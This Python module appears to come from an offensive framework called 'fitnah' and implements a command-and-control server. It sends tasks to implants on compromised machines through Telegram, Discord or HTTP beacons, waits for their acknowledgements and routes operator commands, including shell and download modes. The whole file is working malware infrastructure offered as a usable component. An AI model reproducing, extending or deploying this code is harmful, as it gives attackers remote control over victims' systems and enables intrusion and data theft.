"""
C2 Server — command queue, dispatch, ACK tracking.

Flow:
  operator/plugin → dispatch(agent_id, cmd, args)
      → formats TASK message → sends via Router
      → waits for ACK from implant (with timeout)
      → returns result dict

  implant → sends "ACK:<task_id>:<json>"
      → server resolves the pending future
      → dispatch() call returns to caller
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Callable

from fitnah.c2.router import Router

log = logging.getLogger(__name__)


class TaskStatus(str, Enum):
    PENDING  = "pending"
    ACKED    = "acked"
    TIMEOUT  = "timeout"
    ERROR    = "error"


@dataclass
class Task:
    task_id:    str
    agent_id:   str
    chat_id:    str          # where to send the TASK message
    command:    str
    args:       dict
    created_at: float = field(default_factory=time.time)
    status:     TaskStatus = TaskStatus.PENDING
    future:     asyncio.Future = field(
        default_factory=lambda: asyncio.get_event_loop().create_future()
    )

    def age(self) -> float:
        return time.time() - self.created_at


class C2Server:
    def __init__(self, router: Router, task_timeout: int = 120):
        self._router   = router
        self._timeout  = task_timeout
        self._pending: dict[str, Task] = {}

        # operator-facing command handlers registered by kernel / telegram_ui
        self._handlers: dict[str, Callable] = {}

        # optional middleware: called for every non-JSON text message before
        # command routing (lets TelegramUI intercept shell/download input)
        self._text_middleware: Callable | None = None

        # optional HTTP listener — used to queue tasks for HTTP implants
        self._http_listener = None

        self._running  = False
        self._stats    = {"dispatched": 0, "acked": 0, "timed_out": 0, "errors": 0}

    # ── handler registration ──────────────────────────────────────────────
    def register_handler(self, command: str, fn: Callable) -> None:
        """Bind an operator command string to an async handler."""
        self._handlers[command] = fn
        log.debug("[c2] registered handler: %s", command)

    # ── dispatch ──────────────────────────────────────────────────────────
    async def dispatch(
        self,
        agent_id: str,
        chat_id: str,
        command: str,
        args: dict | None = None,
    ) -> dict:
        """
        Send a command to an agent and await its ACK.

        Returns a result dict:
          {"output": ..., "task_id": ..., "status": "ok"/"error"/"timeout"}
        """
        task_id = _new_task_id()
        args    = args or {}

        task = Task(
            task_id=task_id,
            agent_id=agent_id,
            chat_id=chat_id,
            command=command,
            args=args,
        )
        self._pending[task_id] = task
        self._stats["dispatched"] += 1

        # format wire message
        payload = json.dumps({
            "type":    "TASK",
            "id":      task_id,
            "command": command,
            "args":    args,
        })

        log.info(
            "[c2] dispatch  task=%s  cmd=%-20s  agent=%s",
            task_id, command, agent_id,
        )

        # HTTP agents: queue task for next beacon instead of sending via Telegram
        if self._http_listener and not _is_telegram_chat_id(chat_id):
            self._http_listener.queue_task(agent_id, {
                "type":    "TASK",
                "id":      task_id,
                "command": command,
                "args":    args,
            })
        else:
            await self._router.send(chat_id, payload)

        # wait for ACK with timeout
        try:
            result = await asyncio.wait_for(
                asyncio.shield(task.future), timeout=self._timeout
            )
            task.status = TaskStatus.ACKED
            self._stats["acked"] += 1
            log.info("[c2] ack       task=%s  agent=%s", task_id, agent_id)
            return result

        except asyncio.TimeoutError:
            task.status = TaskStatus.TIMEOUT
            self._stats["timed_out"] += 1
            log.warning("[c2] timeout   task=%s  agent=%s", task_id, agent_id)
            return {"status": "timeout", "task_id": task_id, "output": ""}

        except Exception as exc:
            task.status = TaskStatus.ERROR
            self._stats["errors"] += 1
            log.error("[c2] error     task=%s  %s", task_id, exc)
            return {"status": "error", "task_id": task_id, "output": str(exc)}

        finally:
            self._pending.pop(task_id, None)

    # ── message loop ──────────────────────────────────────────────────────
    async def run(self) -> None:
        """Main message loop — runs forever, reading from the router."""
        self._running = True
        log.info("[c2] message loop started")
        async for msg in self._router.listen():
            try:
                await self._handle_incoming(msg)
            except Exception as exc:
                log.exception("[c2] unhandled error processing message: %s", exc)

    async def stop(self) -> None:
        self._running = False

    # ── incoming message routing ──────────────────────────────────────────
    async def _handle_incoming(self, msg: dict) -> None:
        text      = msg.get("text", "").strip()
        chat_id   = msg.get("chat_id", "")
        sender_id = msg.get("sender_id", "")

        if not text:
            return

        # ── ACK from implant ─────────────────────────────────────────────
        # Wire format: {"type":"ACK","id":"<task_id>","output":"...","status":"ok"}
        if text.startswith("{"):
            try:
                data = json.loads(text)
            except json.JSONDecodeError:
                data = {}

            if data.get("type") == "ACK":
                task_id = data.get("id", "")
                task = self._pending.get(task_id)
                if task and not task.future.done():
                    task.future.set_result({
                        "status":  data.get("status", "ok"),
                        "output":  data.get("output", ""),
                        "task_id": task_id,
                    })
                else:
                    log.warning(
                        "[c2] received ACK for unknown/done task: %s", task_id
                    )
                return

            if data.get("type") == "CHECKIN":
                handler = self._handlers.get("checkin")
                if handler:
                    try:
                        await handler(
                            chat_id=chat_id,
                            sender_id=sender_id,
                            args=text,
                            router=self._router,
                        )
                    except Exception as exc:
                        log.error("[c2] checkin handler raised: %s", exc)
                return

        # ── text middleware (TelegramUI shell/download input modes) ───────
        if self._text_middleware:
            try:
                sid = int(sender_id) if sender_id.isdigit() else 0
                consumed = await self._text_middleware(
                    chat_id=chat_id, sender_id=sid, text=text
                )
                if consumed:
                    return
            except Exception as exc:
                log.warning("[c2] text middleware raised: %s", exc)

        # ── operator command from Telegram/Discord ────────────────────────
        # Text commands: "/sessions", "sessions -l", etc.
        parts = text.lstrip("/").split(None, 1)
        cmd   = parts[0].lower()
        rest  = parts[1] if len(parts) > 1 else ""

        log.info("[c2] routing cmd=%r  chat=%s", cmd, chat_id)
        handler = self._handlers.get(cmd)
        if handler:
            try:
                await handler(
                    chat_id=chat_id,
                    sender_id=sender_id,
                    args=rest,
                    router=self._router,
                )
            except Exception as exc:
                log.error("[c2] handler %s raised: %s", cmd, exc)
                await self._router.send(chat_id, f"Error running {cmd}: {exc}")
        else:
            log.debug("[c2] no handler for command: %r", cmd)

    # ── status / introspection ────────────────────────────────────────────
    def pending_tasks(self) -> list[dict]:
        return [
            {
                "task_id": t.task_id,
                "agent_id": t.agent_id,
                "command": t.command,
                "age_s": round(t.age(), 1),
                "status": t.status,
            }
            for t in self._pending.values()
        ]

    def stats(self) -> dict:
        return dict(self._stats)

    def stats_display(self) -> str:
        s = self._stats
        return (
            f"  Tasks dispatched : {s['dispatched']}\n"
            f"  Tasks ACKed      : {s['acked']}\n"
            f"  Tasks timed out  : {s['timed_out']}\n"
            f"  Errors           : {s['errors']}\n"
            f"  Pending          : {len(self._pending)}"
        )


# ── helpers ───────────────────────────────────────────────────────────────────

def _new_task_id() -> str:
    return uuid.uuid4().hex[:8]


def _is_telegram_chat_id(chat_id: str) -> bool:
    """Telegram chat IDs are integers. HTTP agent IDs are hex strings."""
    try:
        int(chat_id)
        return True
    except (ValueError, TypeError):
        return False
